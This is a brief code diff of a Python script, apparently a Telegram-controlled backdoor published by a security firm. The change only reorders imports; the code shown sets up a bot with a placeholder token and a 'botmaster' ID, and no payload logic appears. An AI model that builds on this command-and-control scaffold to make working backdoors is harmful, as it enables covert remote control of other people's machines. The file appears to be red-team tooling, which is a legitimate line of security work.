@@ -14,22 +14,25 @@
 # Copyright 2016, Blaze Information Security
 # https://www.blazeinfosec.com
 
+import os
+import pprint
 import sys
 import time
-import os
+
+from backdoorutils import *
+
 try:
     import telepot
 except ImportError:
     print "[!] Module 'telepot' not found. Please install it before continuing."
     sys.exit(-1)
-from backdoorutils import *
-import pprint
 
 API_TOKEN = 'YOUR_API_KEY_HERE'
 BOTMASTER_ID = 00000000
 VERBOSE = True
 
 bot = telepot.Bot(API_TOKEN)
+
 
 def handle_message(msg):
     content_type, chat_type, chat_id = telepot.glance(msg)
